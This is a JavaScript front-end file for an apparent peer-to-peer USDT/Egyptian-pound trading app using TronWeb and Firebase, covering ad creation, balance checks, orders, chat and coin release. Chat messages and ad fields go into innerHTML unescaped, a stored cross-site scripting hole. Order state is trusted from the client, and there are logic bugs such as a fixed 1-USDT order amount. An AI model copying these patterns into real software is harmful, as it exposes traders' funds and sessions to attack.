            // Trying to sell more than available - BLOCK publishing
            container.style.borderColor = 'red';
            container.style.borderWidth = '1px';
            container.style.borderStyle = 'solid';
            showToast('Insufficient balance. You cannot sell more than your available USDT.', 'error');
            return false; // Block publishing
        } else if (amountValue > 0 && amountValue <= balance) {
            // Valid amount within balance - ALLOW publishing
            container.style.borderColor = 'green';
            container.style.borderWidth = '1px';
            container.style.borderStyle = 'solid';
            return true; // Allow publishing
        } else {
            // Empty input - neutral black border
            container.style.borderColor = 'black';
            container.style.borderWidth = '1px';
            container.style.borderStyle = 'solid';
            return false; // Don't allow publishing empty amount
        }
    } catch (error) {
        console.error('Error checking balance:', error);
        return false;
    }
}

// MAIN VALIDATION FUNCTION - COMPLETELY SEPARATED LOGIC
async function handleBalanceCheck(input) {
    if (adFormMode === 'buy') {
        // BUY MODE: COMPLETELY DISABLE balance checks + popups
        return;
    } else {
        // SELL MODE: STRICT BALANCE LOCK
        await handleSellModeValidation(input);
        return;
    }
}

// Create Ad only: "Max" button behavior (Sell mode only)
async function setCreateAdMaxAmount() {
    if (adFormMode === 'buy') return; // hard guard: never usable in Buy mode

    if (!tronWeb) {
        showToast('Please connect wallet first', 'error');
        return;
    }

    try {
        const balance = await checkUSDTBalance(tronWeb.defaultAddress.base58);
        const amountInput = document.getElementById('amountIn');
        if (!amountInput) return;

        amountInput.value = balance.toFixed(2);
        await handleBalanceCheck(amountInput);
        updateCreateAdUIState();
    } catch (error) {
        console.error('Error setting max amount:', error);
        showToast('Failed to get balance', 'error');
    }
}

function updateCreateAdUIState() {
    const priceIn = document.getElementById('priceIn');
    const amountIn = document.getElementById('amountIn');
    const minIn = document.getElementById('minIn');
    const maxIn = document.getElementById('maxIn');
    const totalEl = document.getElementById('totalEGP');
    const publishBtn = document.getElementById('publishButton');
    if (!priceIn || !amountIn || !minIn || !maxIn || !publishBtn || !totalEl) return;

    const price = parseFloat(priceIn.value) || 0;
    const qty = parseFloat(amountIn.value) || 0;
    const total = price > 0 && qty > 0 ? price * qty : 0;
    totalEl.textContent = total.toFixed(2);

    // Per requested UX: enable button once Price + Quantity are entered.
    const requiredFilled = price > 0 && qty > 0;

    publishBtn.disabled = !requiredFilled;
}

// Market price placeholder (wire to API later)
async function getCurrentPrice() {
    // TODO: Connect to a real USDT/EGP price API.
    // Return a number (e.g., 50.25) when integrated.
    return null;
}

async function refreshMarketPriceInfo() {
    const el = document.getElementById('marketPriceInfo');
    if (!el) return;

    try {
        const p = await getCurrentPrice();
        if (typeof p === 'number' && Number.isFinite(p) && p > 0) {
            el.textContent = `${p.toFixed(2)} EGP`;
        } else {
            el.textContent = '—';
        }
    } catch (e) {
        el.textContent = '—';
    }
}

// Create Ad submit button: 20-second simulated loading UX
async function handleCreateAdSubmit(btn) {
    if (!btn) return;
    if (btn.disabled) return;

    updateCreateAdUIState();
    if (btn.disabled) return;

    const originalHTML = btn.innerHTML;
    const originalClass = btn.className;

    btn.disabled = true;
    btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin ml-2"></i> جاري معالجة طلبك...`;
    btn.className = btn.className.replace(/bg-\w+-\d+/g, '').trim() + ' bg-gray-400';

    // Wait for exactly 20 seconds before Firebase submission.
    await new Promise(resolve => setTimeout(resolve, 20000));

    try {
        await submitCreateAdToFirebase(btn);
    } finally {
        // Restore button (in case submission fails, user can retry)
        btn.innerHTML = originalHTML;
        btn.className = originalClass;
        updateCreateAdUIState();
    }
}

async function submitCreateAdToFirebase(publishBtn) {
    if (!tronWeb) {
        showToast("Connect your wallet first", "error");
        return;
    }

    const priceIn = document.getElementById('priceIn');
    const amountIn = document.getElementById('amountIn');
    const minIn = document.getElementById('minIn');
    const maxIn = document.getElementById('maxIn');

    if (!priceIn || !amountIn || !minIn || !maxIn) {
        showToast('Form elements not found', 'error');
        return;
    }

    const price = priceIn.value.trim();
    const amount = amountIn.value.trim();
    const min = minIn.value.trim();
    const max = maxIn.value.trim();

    const selectedPaymentText = document.getElementById('selectedPaymentText');
    const paymentMethod = selectedPaymentText ? selectedPaymentText.textContent : '';
    const myAddr = tronWeb?.defaultAddress?.base58;

    // Minimal enablement is Price+Quantity, but submission still validates required fields.
    if (!price || parseFloat(price) <= 0) return showToast('يرجى إدخال السعر', 'error');
    if (!amount || parseFloat(amount) <= 0) return showToast('يرجى إدخال كمية صحيحة أكبر من 0', 'error');
    if (!min || parseFloat(min) <= 0) return showToast('يرجى إدخال الحد الأدنى', 'error');
    if (!max || parseFloat(max) <= 0) return showToast('يرجى إدخال الحد الأقصى', 'error');
    if (parseFloat(min) > parseFloat(max)) return showToast('الحد الأدنى لا يمكن أن يكون أكبر من الحد الأقصى', 'error');

    const totalValue = parseFloat(amount) * parseFloat(price);
    if (parseFloat(max) > totalValue) {
        return showToast(`الحد الأقصى (${max} EGP) لا يمكن أن يتجاوز إجمالي قيمة الإعلان (${totalValue.toFixed(2)} EGP)`, 'error');
    }

    if (!paymentMethod || paymentMethod === 'اختر طريقة الدفع' || paymentMethod === 'Select payment method') {
        return showToast('يرجى اختيار طريقة الدفع', 'error');
    }
    if (!myAddr) {
        return showToast('Wallet not connected', 'error');
    }

    // Sell mode balance check only
    if (adFormMode !== 'buy') {
        const balance = await checkUSDTBalance(myAddr);
        if (parseFloat(amount) > balance) {
            return showToast(`Insufficient balance. Available: ${balance.toFixed(2)} USDT`, 'error');
        }
    }

    // Firebase submission
    await saveAdToDatabase(publishBtn, paymentMethod);
}

document.addEventListener('DOMContentLoaded', () => {
    const priceIn = document.getElementById('priceIn');
    const amountIn = document.getElementById('amountIn');
    const minIn = document.getElementById('minIn');
    const maxIn = document.getElementById('maxIn');

    [priceIn, amountIn, minIn, maxIn].forEach(el => {
        if (!el) return;
        el.addEventListener('input', updateCreateAdUIState);
    });

    refreshMarketPriceInfo();
    setInterval(refreshMarketPriceInfo, 30000);

    updateCreateAdUIState();
});

async function updateSellBalance() {
    if(tronWeb) {
        try {
            const balance = await checkUSDTBalance(tronWeb.defaultAddress.base58);
            document.getElementById('sellBalanceText').textContent = `Available: ${balance.toFixed(2)} USDT`;
        } catch(error) {
            console.error('Error updating sell balance:', error);
        }
    }
}

async function saveAdToDatabase(publishBtn, paymentMethod) {
    try {
        const price = document.getElementById('priceIn').value.trim();
        const amount = document.getElementById('amountIn').value.trim();
        const min = document.getElementById('minIn').value.trim();
        const max = document.getElementById('maxIn').value.trim();
        const myAddr = tronWeb.defaultAddress.base58;
        
        // Data integrity - ensure all required fields are present with correct types
        const adData = {
            price: String(price), // Ensure string type
            amount: String(amount), // Ensure string type
            min: String(min), // Ensure string type
            max: String(max), // Ensure string type
            payMethod: String(paymentMethod), // Ensure string type
            type: String(adFormMode), // Must be 'buy' or 'sell'
            owner: String(myAddr), // Ensure string type (wallet address)
            status: 'active', // Must be 'active' for new ads
            createdAt: Number(Date.now()) // Ensure number type
        };
        
        await db.collection("ads").add(adData);

        showToast('Published successfully', 'success');
        
        // Clear form
        document.getElementById('priceIn').value = '';
        document.getElementById('amountIn').value = '';
        document.getElementById('minIn').value = '';
        document.getElementById('maxIn').value = '';
        // Reset payment dropdown to default
        document.getElementById('selectedPaymentText').textContent = 'Select payment method';
        const paymentCheckmark = document.getElementById('paymentCheckmark');
        if (paymentCheckmark) paymentCheckmark.classList.add('hidden');
        selectedPayment = '';
        
        navTo('p2p', 0);
    } catch(error) {
        console.error('Error saving ad:', error);
        showToast('Error saving ad: ' + error.message, 'error');
    }
}

// --- [12. Order Creation & Balance Verification] ---
async function createOrder(adId, owner, adType) {
    if(!tronWeb) return showToast("Connect your wallet", "error");
    const myAddr = tronWeb.defaultAddress.base58;
    if(myAddr === owner) return showToast("You cannot trade with yourself!", 'error');

    try {
        const adSnap = await db.collection("ads").doc(adId).get();
        const adData = adSnap.data();
        
        // Use Firestore transaction for atomic operations
        await db.runTransaction(async (transaction) => {
            const adRef = db.collection("ads").doc(adId);
            const adDoc = await transaction.get(adRef);
            
            if (!adDoc.exists) {
                throw new Error('Ad no longer exists');
            }
            
            const currentAmount = parseFloat(adDoc.data().amount);
            
            // [Security Operations]: If buyer enters sell ad (red) to sell USDT to merchant, must verify buyer's balance
            if(adType === 'sell') {
                const balance = await checkUSDTBalance(myAddr);
                if(balance < currentAmount) {
                    throw new Error('You have insufficient balance to complete the sale to the merchant');
                }
                
                // Lock buyer's USDT for sell ads
                const lockResult = await lockUSDT(currentAmount, 'ORDER-' + Date.now());
                if (!lockResult.success) {
                    throw new Error('Failed to lock coins: ' + lockResult.error);
                }
            }
            
            // Decrease available amount atomically
            const newAmount = Math.max(0, currentAmount - 1); // Assuming 1 USDT per order, adjust as needed
            transaction.update(adRef, { amount: newAmount.toString() });
            
            // Create order
            const oId = "ORD-" + Math.floor(100000 + Math.random() * 900000);
            const orderRef = db.collection("orders").doc(oId);
            transaction.set(orderRef, {
                adId, adOwner: owner, taker: myAddr, type: adType,
                status: 'pending', isPaid: false, createdAt: Date.now(),
                amount: '1', // Default order amount
                price: adData.price
            });
            
            // Play notification sound
            playNotificationSound('new_order');
            
            return oId;
        });
        
        navTo('orders', 1);
        
    } catch (error) {
        console.error('Create order error:', error);
        showToast('Error creating order: ' + error.message, 'error');
    }
}

// --- [13. Order Management & Chat] ---
function filterOrders(status, btn) {
    currentOrderFilter = status;
    document.querySelectorAll('#ordersPage button').forEach(b => b.classList.remove('tab-active', 'text-black'));
    btn.classList.add('tab-active', 'text-black');
    renderOrders();
}

function renderOrders() {
    const list = document.getElementById('ordersList');
    const myAddr = tronWeb?.defaultAddress?.base58;
    if(!myAddr) return list.innerHTML = "<p class='text-center mt-10 text-gray-400'>Login first</p>";

    db.collection("orders").where("status", "==", currentOrderFilter).onSnapshot(async snap => {
        const myOrders = snap.docs.filter(d => d.data().adOwner === myAddr || d.data().taker === myAddr);
        if(myOrders.length === 0) { list.innerHTML = "<p class='text-center mt-10 text-gray-400 text-xs'>No orders currently</p>"; return; }

        let html = "";
        for(let doc of myOrders) {
            const o = doc.data();
            const adDoc = await db.collection("ads").doc(o.adId).get();
            const adData = adDoc.data() || { price: 0, amount: 0 };
            
            const isOwner = myAddr === o.adOwner;
            const amIBuyer = (o.type === 'buy' && !isOwner) || (o.type === 'sell' && isOwner);
            const amISeller = !amIBuyer;

            html += `
            <div class="p-4 border rounded-2xl bg-white card-shadow">
                <div class="flex justify-between items-center border-b pb-2 mb-3">
                    <span class="text-[10px] font-bold text-gray-400">#${doc.id} | ${o.type==='buy'?'Buy':'Sell'}</span>
                    <div class="flex gap-2">
                        <button onclick="openChat('${doc.id}', ${o.createdAt})" class="text-blue-600 text-[10px] font-bold bg-blue-50 px-3 py-1 rounded">
                            <i class="fa-solid fa-comments"></i> Chat
                        </button>
                        <button onclick="openAppeal('${doc.id}')" class="text-orange-600 text-[10px] font-bold bg-orange-50 px-3 py-1 rounded">
                            <i class="fa-solid fa-exclamation-triangle"></i> Support
                        </button>
                    </div>
                </div>
                <div class="flex justify-between items-end">
                    <div>
                        <div class="text-lg font-black price-font">${adData.price} EGP</div>
                        <div class="text-[11px] text-gray-500 font-medium">Quantity: ${o.amount || '1'} USDT</div>
                    </div>
                    <div class="flex flex-col gap-2">
                        ${currentOrderFilter === 'pending' ? `
                            ${amIBuyer && !o.isPaid ? `<button onclick="confirmPay('${doc.id}')" class="bg-black text-white px-5 py-2 rounded-lg text-xs font-bold">Paid</button>` : ''}
                            ${amISeller && o.isPaid ? `<button onclick="releaseCrypto('${doc.id}')" class="bg-green-600 text-white px-5 py-2 rounded-lg text-xs font-bold">Release Coins</button>` : ''}
                            ${amISeller && !o.isPaid ? `<span class="text-orange-500 text-[10px] font-bold">Waiting for payment...</span>` : ''}
                            ${canCancelOrder(o, isOwner) ? `<button onclick="cancelReq('${doc.id}')" class="text-red-500 text-[9px] mt-1 font-bold">Cancel Order</button>` : ''}
                        ` : ''}
                    </div>
                </div>
            </div>`;
        }
        list.innerHTML = html || "<p class='text-center text-gray-400 mt-10 text-xs'>No orders currently</p>";
    });
}

function canCancelOrder(order, isOwner) {
    // In Sell Ads (Green): Only the Buyer can cancel
    // In Buy Ads (Red): Only the Merchant can cancel
    if (order.type === 'buy') {
        return !isOwner; // Only buyer (taker) can cancel sell ads
    } else {
        return isOwner; // Only merchant (ad owner) can cancel buy ads
    }
}

// --- [14. Real-time Chat Logic] ---
let timerFrozen = false;

function openChat(id, time) {
    activeOrderId = id;
    document.getElementById('chatOverlay').style.display = 'flex';
    document.getElementById('chatHeaderName').innerText = "Order #: " + id;
    
    clearInterval(timerInt);
    timerFrozen = false;
    
    timerInt = setInterval(() => {
        if (timerFrozen) return; // Don't update if frozen
        
        const remain = (time + (15 * 60 * 1000)) - Date.now();
        if(remain <= 0) { 
            document.getElementById('timerDisplay').innerText = "Time expired";
            document.getElementById('timerDisplay').className = "text-red-600 font-bold text-xs";
            clearInterval(timerInt);
            
            // Auto-cancel order if time expires
            db.collection("orders").doc(id).update({ status: 'cancelled' });
        } else {
            const m = Math.floor(remain / 60000), s = Math.floor((remain % 60000) / 1000);
            document.getElementById('timerDisplay').innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
            document.getElementById('timerDisplay').className = remain < 300000 ? "text-red-600 font-bold text-xs animate-pulse" : "text-red-600 font-bold text-xs";
        }
    }, 1000);

    rtdb.ref('chats/' + id).on('value', snap => {
        const data = snap.val() ? Object.values(snap.val()) : [];
        const myAddr = tronWeb.defaultAddress.base58;
        document.getElementById('chatBody').innerHTML = data.map(m => `
            <div class="flex ${m.sender === myAddr ? 'justify-end' : 'justify-start'}">
                <div class="max-w-[80%] p-3 rounded-2xl text-sm ${m.sender === myAddr ? 'bg-black text-white rounded-br-none' : 'bg-white border text-black rounded-bl-none shadow-sm'}">
                    ${m.text}
                    <div class="text-[9px] opacity-60 mt-1">${new Date(m.time).toLocaleTimeString('ar-EG')}</div>
                </div>
            </div>`).join('');
        const b = document.getElementById('chatBody'); b.scrollTop = b.scrollHeight;
    });
}

function sendMsg() {
    const inp = document.getElementById('chatInput');
    if(!inp.value || !activeOrderId) return;
    rtdb.ref('chats/' + activeOrderId).push({ 
        sender: tronWeb.defaultAddress.base58, 
        text: inp.value, 
        time: Date.now() 
    });
    inp.value = "";
    
    // Play notification for new message
    playNotificationSound('new_message');
}

function closeChat() { 
    document.getElementById('chatOverlay').style.display = 'none'; 
    clearInterval(timerInt); 
    timerFrozen = false;
}

// --- [15. Order Operations] ---
function confirmPay(id) { 
    if (confirm('Confirm payment? After confirmation, the timer will be frozen and you will wait for the merchant to release the coins')) {
        (async () => {
            try {
                const orderRef = db.collection("orders").doc(id);
                await orderRef.update({
                    isPaid: true,
                    paidAt: Date.now()
                });
                
                document.getElementById('timerDisplay').innerText = "Waiting for release";
                document.getElementById('timerDisplay').className = "text-orange-600 font-bold text-xs";
                
                showToast('Payment confirmed! Please wait for merchant to release coins', 'success');
            } catch (error) {
                showToast('Payment confirmation failed: ' + error.message, 'error');
            }
        })();
    }
}

async function releaseCrypto(id) {
    if (confirm('Confirm release coins? USDT will be released to the buyer immediately')) {
        try {
            const releaseResult = await releaseUSDT(id);
            if (releaseResult.success) {
                const orderRef = db.collection("orders").doc(id);
                await orderRef.update({
                    status: 'completed',
                    completedAt: Date.now()
                });
                
                // Increase merchant's completion rate by 10%
                await increaseMerchantCompletionRate(id);
                
                showToast("Coins released successfully", 'success');
            } else {
                showToast("Failed to release coins: " + releaseResult.error, 'error');
            }
        } catch (error) {
            showToast('Failed to release coins: ' + error.message, 'error');
        }
    }
}

async function increaseMerchantCompletionRate(orderId) {
    try {
        // Get the order to find the merchant (adOwner)
        const orderDoc = await db.collection("orders").doc(orderId).get();
        const orderData = orderDoc.data();
        const merchantAddress = orderData.adOwner;
        
        // Get merchant's current completion rate from user profile or ads collection
        // For now, we'll store completion rate in a separate collection
        const merchantProfileRef = db.collection("merchantProfiles").doc(merchantAddress);
        const merchantDoc = await merchantProfileRef.get();
        
        let currentRate = 0;
        if (merchantDoc.exists) {
            currentRate = parseFloat(merchantDoc.data().completionRate) || 0;
        }
        
        // Increase by 10%, but cap at 100%
        let newRate = Math.min(currentRate + 10, 100);
        
        // Update merchant's completion rate
        await merchantProfileRef.set({
            completionRate: newRate,
            completedOrders: (merchantDoc.exists ? (merchantDoc.data().completedOrders || 0) : 0) + 1,
            lastUpdated: Date.now()
        }, { merge: true });
        
        console.log(`Updated completion rate for merchant ${merchantAddress}: ${currentRate}% -> ${newRate}%`);
        
    } catch (error) {
        console.error('Error updating completion rate:', error);
        return false;
    }
    return true;
}

function cancelReq(id) {
    if (confirm('Cancel order? The order will be cancelled and reserved coins will be returned')) {
        (async () => {
            try {
                await db.collection("orders").doc(id).update({
                    status: 'cancelled',
                    cancelledAt: Date.now()
                });
                showToast('Order cancelled', 'success');
            } catch (error) {
                showToast('Order cancellation failed: ' + error.message, 'error');
            }
        })();
    }
}

function openAppeal(orderId) {
    const appealMessage = `Technical Support\n\nIf you encounter any issues with this order, you can contact technical support:\n\nSupport link:\n${TELEGRAM_SUPPORT_LINK}`;
    alert(appealMessage);
}

function playNotificationSound(type) {
    if (!notificationAudio) return;
    
    try {
        notificationAudio.currentTime = 0;
        notificationAudio.play().catch(e => console.log('Audio play failed:', e));
    } catch (error) {
        console.log('Notification sound error:', error);
    }
}

// --- [16. My Ads Management] ---
function filterMyAds(f, btn) {
    currentAdFilter = f;
    document.querySelectorAll('#adsPage .tab-active').forEach(b => b.classList.remove('tab-active'));
    btn.classList.add('tab-active');
    renderMyAds();
}

function renderMyAds() {
    const container = document.getElementById('myAdsList');
    const myAddr = tronWeb?.defaultAddress?.base58;
    if(!myAddr) return;

    db.collection("ads").where("owner", "==", myAddr).onSnapshot(snap => {
        const ads = snap.docs.map(d => ({id: d.id, ...d.data()}));
        userAds = ads; // Populate userAds array for editAd function
        const filtered = ads.filter(a => currentAdFilter === 'active' ? a.status === 'active' : a.status !== 'active');
        document.getElementById('countActive').innerText = ads.filter(a => a.status === 'active').length;

        // UI refresh - only show ads with valid data and use correct field names
        const validAds = filtered.filter(a => a.price && a.amount && a.payMethod);
        
        if(validAds.length === 0) {
            // OKX-style empty state
            container.innerHTML = `
                <div class="text-center py-20">
                    <div class="w-20 h-20 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-4">
                        <i class="fa-solid fa-bullhorn text-gray-400 text-2xl"></i>
                    </div>
                    <h3 class="text-lg font-bold text-gray-600 mb-2">No ads found</h3>
                    <p class="text-sm text-gray-500 mb-6">Create an ad to buy or sell digital currencies.</p>
                    <button onclick="showPage('createAd')" class="text-white px-6 py-3 rounded-xl font-medium hover:bg-gray-700 transition-colors" style="background-color: #808080 !important;">
                        <i class="fa-solid fa-plus ml-2"></i> Create Ad
                    </button>
                </div>
            `;
            return;
        }

        // OKX-style ads display
        container.innerHTML = validAds.map(a => {
            const typeColor = a.type === 'buy' ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700';
            const typeText = a.type === 'buy' ? 'selling' : 'selling';
            
            return `
                <div class="bg-white border border-gray-200 rounded-2xl p-4 hover:shadow-lg transition-shadow">
                    <!-- Ad Header -->
                    <div class="flex justify-between items-start mb-4">
                        <div class="flex items-center gap-2">
                            <span class="${typeColor} px-3 py-1 rounded-full text-xs font-bold">${typeText}</span>
                            <span class="text-gray-500 text-sm">${Math.floor((Date.now() - a.createdAt) / (1000 * 60 * 60 * 24))} days ago</span>
                        </div>
                        <div class="flex gap-2">
                            <button onclick="editAd('${a.id}')" class="text-blue-600 hover:text-blue-700 text-sm font-medium">
                                <i class="fa-solid fa-pen"></i> learn
                            </button>
                            <button onclick="viewAdDetails('${a.id}')" class="text-gray-600 hover:text-gray-700 text-sm font-medium">
                                <i class="fa-solid fa-eye"></i> details
                            </button>
                        </div>
                    </div>
                    
                    <!-- Price Section -->
                    <div class="bg-gradient-to-r from-blue-50 to-indigo-50 p-4 rounded-xl mb-3">
                        <div class="flex items-baseline justify-between">
                            <div>
                                <span class="text-3xl font-black">${a.price}</span>
                                <span class="text-lg text-gray-600 ml-1">EGP</span>
                            </div>
                            <div class="text-right">
                                <div class="text-sm text-gray-500">Available Quantity</div>
                                <div class="text-xl font-bold text-blue-600">${a.amount} <span class="text-sm font-normal">USDT</span></div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Limits & Payment -->
                    <div class="grid grid-cols-2 gap-4 mb-3">
                        <div class="bg-gray-50 p-3 rounded-xl">
                            <div class="text-xs text-gray-500 mb-1">Limits</div>
                            <div class="font-bold text-gray-800">${a.min} - ${a.max} EGP</div>
                        </div>
                        <div class="bg-gray-50 p-3 rounded-xl">
                            <div class="text-xs text-gray-500 mb-1">Payment Method</div>
                            <div class="font-bold text-gray-800">${a.payMethod || 'Not specified'}</div>
                        </div>
                    </div>
                    
                    <!-- Management Buttons -->
                    <div class="flex justify-between items-center">
                        <span class="${a.status === 'active' ? 'bg-green-100 text-green-700' : 'bg-gray-100 text-gray-700'} px-3 py-1 rounded-full text-xs font-bold">
                            ${a.status === 'active' ? 'Active' : 'Inactive'}
                        </span>
                        <div class="flex gap-2">
                            <button onclick="editAd('${a.id}')" 
                                    class="text-blue-600 hover:text-blue-700 text-sm font-medium">
                                <i class="fa-solid fa-pen"></i> edit
                            </button>
                            <button onclick="confirmCancelAd('${a.id}')" 
                                    class="text-red-600 hover:text-red-700 text-sm font-medium">
                                <i class="fa-solid fa-times"></i> cancel
                            </button>
                        </div>
                    </div>
                </div>
            `;
        }).join('');
    });
}

function toggleAd(id, cur) { db.collection("ads").doc(id).update({ status: cur === 'active' ? 'inactive' : 'active' }); }

// --- [17. Payment Dropdown Functions] ---
let selectedPayment = '';

function togglePaymentDropdown() {
    const dropdown = document.getElementById('paymentDropdown');
    dropdown.classList.toggle('hidden');
    
    // Close dropdown when clicking outside
    if (!dropdown.classList.contains('hidden')) {
        setTimeout(() => {
            document.addEventListener('click', closePaymentDropdown);
        }, 100);
    }
}

function closePaymentDropdown(e) {
    const dropdown = document.getElementById('paymentDropdown');
    const selector = document.getElementById('paymentSelector');
    
    if (!selector.contains(e.target) && !dropdown.contains(e.target)) {
        dropdown.classList.add('hidden');
        document.removeEventListener('click', closePaymentDropdown);
    }
}

function selectPayment(payment) {
    selectedPayment = payment;
    const dropdown = document.getElementById('paymentDropdown');
    const selectorText = document.getElementById('selectedPaymentText');
    const checkmark = document.getElementById('paymentCheckmark');
    
    selectorText.textContent = payment;
    if (checkmark) checkmark.classList.remove('hidden');
    dropdown.classList.add('hidden');
    document.removeEventListener('click', closePaymentDropdown);

    updateCreateAdUIState();
}

// --- [18. Initialize Application] ---
window.onload = () => navTo('p2p', 0);

// UI-only fix: swap Buy/Sell toggle button positions on Ad Creation page
document.addEventListener('DOMContentLoaded', () => {
    const buyBtn = document.getElementById('modeBuy');
    const sellBtn = document.getElementById('modeSell');
    const wrapper = buyBtn?.parentElement;
    
    if (wrapper && buyBtn && sellBtn) {
        // Put "Buy" where "Sell" is and vice versa (swap DOM order)
        wrapper.insertBefore(sellBtn, buyBtn);
    }

    // Ensure initial UI + logic are synced for button colors & balance behavior
    if (buyBtn?.classList.contains('bg-green-600')) {
        setAdMode('buy');
    } else if (sellBtn?.classList.contains('bg-red-600')) {
        setAdMode('sell');
    }
});
